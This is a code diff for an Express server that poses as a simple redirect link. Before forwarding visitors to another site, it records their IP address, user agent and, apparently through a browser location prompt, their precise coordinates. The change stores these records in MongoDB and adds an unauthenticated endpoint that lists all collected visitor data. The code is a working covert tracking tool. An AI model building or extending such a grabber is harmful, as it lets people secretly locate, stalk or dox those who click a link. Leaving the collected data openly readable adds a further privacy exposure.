@@ -1,63 +1,155 @@
+require('dotenv').config();
 const express = require('express');
 const path = require('path');
+const { MongoClient } = require('mongodb');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Configuration: Set your redirect URL here
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
+const MONGODB_URI = process.env.MONGODB_URI;
+
+// MongoDB connection
+let db;
+let logsCollection;
+
+// Connect to MongoDB
+async function connectToMongoDB() {
+  if (!MONGODB_URI) {
+    console.warn('⚠️  MONGODB_URI not set - logs will only appear in console');
+    return;
+  }
+
+  try {
+    const client = new MongoClient(MONGODB_URI);
+    await client.connect();
+    db = client.db('redirection-logs');
+    logsCollection = db.collection('visitor-logs');
+
+    // Create indexes for better query performance
+    await logsCollection.createIndex({ timestamp: -1 });
+    await logsCollection.createIndex({ ip: 1 });
+
+    console.log('✅ Connected to MongoDB - logs will be persisted');
+  } catch (error) {
+    console.error('❌ MongoDB connection error:', error.message);
+    console.warn('⚠️  Continuing without MongoDB - logs will only appear in console');
+  }
+}
+
+// Initialize MongoDB connection
+connectToMongoDB();
 
 // Middleware to parse JSON
 app.use(express.json());
 
-// Serve the HTML page with location request
-app.get('/', (req, res) => {
-  // Log IP immediately when user enters the website
-  const ip = req.headers['x-forwarded-for'] ||
+// Helper function to extract IP address
+function getClientIP(req) {
+  return req.headers['x-forwarded-for'] ||
     req.headers['x-real-ip'] ||
     req.connection.remoteAddress ||
     req.socket.remoteAddress ||
     (req.connection.socket ? req.connection.socket.remoteAddress : null);
+}
 
+// Serve the HTML page with location request
+app.get('/', (req, res) => {
+  // Log IP immediately when user enters the website
+  const ip = getClientIP(req);
   console.log(`👤 Visitor entered - IP: ${ip}`);
 
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 // API endpoint to log IP and location data
-app.post('/log', (req, res) => {
-  // Get IP address (handles proxies and direct connections)
-  const ip = req.headers['x-forwarded-for'] ||
-    req.headers['x-real-ip'] ||
-    req.connection.remoteAddress ||
-    req.socket.remoteAddress ||
-    (req.connection.socket ? req.connection.socket.remoteAddress : null);
+app.post('/log', async (req, res) => {
+  try {
+    // Get IP address (handles proxies and direct connections)
+    const ip = getClientIP(req);
+    const { latitude, longitude, accuracy, denied } = req.body;
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const timestamp = new Date();
 
-  const { latitude, longitude, accuracy, denied } = req.body;
+    // Create log entry object
+    const logData = {
+      ip,
+      timestamp,
+      userAgent,
+      location: denied
+        ? { status: 'DENIED' }
+        : (latitude && longitude)
+          ? { latitude, longitude, accuracy }
+          : { status: 'NOT_AVAILABLE' },
+      redirectUrl: REDIRECT_URL
+    };
 
-  // Create log entry - only IP and location
-  let logEntry;
-  if (denied) {
-    logEntry = `IP: ${ip} | Location: DENIED`;
-  } else if (latitude && longitude) {
-    logEntry = `IP: ${ip} | Location: ${latitude}, ${longitude}`;
-  } else {
-    logEntry = `IP: ${ip} | Location: NOT AVAILABLE`;
+    // Create console log entry
+    let consoleLogEntry;
+    if (denied) {
+      consoleLogEntry = `IP: ${ip} | Location: DENIED`;
+    } else if (latitude && longitude) {
+      consoleLogEntry = `IP: ${ip} | Location: ${latitude}, ${longitude}`;
+    } else {
+      consoleLogEntry = `IP: ${ip} | Location: NOT AVAILABLE`;
+    }
+
+    // Log to console (visible in Vercel dashboard)
+    console.log(`🔍 ${consoleLogEntry}`);
+    console.log(`↪️  Redirecting to: ${REDIRECT_URL}`);
+
+    // Save to MongoDB if connected
+    if (logsCollection) {
+      try {
+        await logsCollection.insertOne(logData);
+        console.log('💾 Log saved to MongoDB');
+      } catch (dbError) {
+        console.error('❌ Error saving to MongoDB:', dbError.message);
+      }
+    }
+
+    // Send redirect URL back to client
+    res.json({ redirectUrl: REDIRECT_URL });
+  } catch (error) {
+    console.error('❌ Error in /log endpoint:', error.message);
+    res.status(500).json({ error: 'Internal server error' });
   }
+});
 
-  // Log to console (visible in Vercel dashboard)
-  console.log(`🔍 ${logEntry}`);
-  console.log(`↪️  Redirecting to: ${REDIRECT_URL}`);
+// API endpoint to retrieve logs (optional - for viewing logs)
+app.get('/api/logs', async (req, res) => {
+  try {
+    if (!logsCollection) {
+      return res.status(503).json({
+        error: 'MongoDB not connected',
+        message: 'Logs are only available in console'
+      });
+    }
 
-  // Send redirect URL back to client
-  res.json({ redirectUrl: REDIRECT_URL });
+    const limit = parseInt(req.query.limit) || 100;
+    const logs = await logsCollection
+      .find({})
+      .sort({ timestamp: -1 })
+      .limit(limit)
+      .toArray();
+
+    res.json({
+      count: logs.length,
+      logs
+    });
+  } catch (error) {
+    console.error('❌ Error fetching logs:', error.message);
+    res.status(500).json({ error: 'Error fetching logs' });
+  }
 });
 
 // Start server
 app.listen(PORT, () => {
   console.log(`🚀 Redirection app running on port ${PORT}`);
   console.log(`📍 Redirecting all traffic to: ${REDIRECT_URL}`);
-  console.log(`📝 Logging IPs and locations to console only`);
+  console.log(`📝 Logging to: ${MONGODB_URI ? 'MongoDB + Console' : 'Console only'}`);
   console.log(`\n💡 To change redirect URL, set REDIRECT_URL environment variable`);
-  console.log(`   Example: REDIRECT_URL=https://example.com npm start\n`);
+  console.log(`   Example: REDIRECT_URL=https://example.com npm start`);
+  console.log(`\n💡 To enable MongoDB logging, set MONGODB_URI environment variable\n`);
 });
+
